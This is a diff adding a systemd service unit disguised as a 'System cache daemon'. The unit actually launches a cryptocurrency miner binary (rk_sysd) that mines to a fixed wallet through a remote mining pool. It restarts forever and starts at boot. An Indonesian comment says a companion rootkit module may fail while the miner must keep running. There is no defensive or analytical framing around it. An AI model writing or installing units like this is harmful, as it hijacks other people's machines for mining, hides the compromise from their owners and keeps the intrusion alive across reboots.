@@ -1,0 +1,20 @@
+[Unit]
+Description=System cache daemon
+After=network-online.target syspreload.service
+Wants=network-online.target
+# Wants= (bukan Requires=): modul rootkit boleh gagal, miner tetap harus jalan.
+Wants=syspreload.service
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/rk_sysd --ui=log -t 4
+Restart=always
+RestartSec=10
+LimitMEMLOCK=infinity
+NoNewPrivileges=true
+Environment=WALLET=cb23d6d8557e776f5ff9ab6a7fb7f59a3d385245fa7a
+Environment=POOL=sg.catchthatrabbit.com:8008
+Environment=WORKER=replace-me
+
+[Install]
+WantedBy=multi-user.target
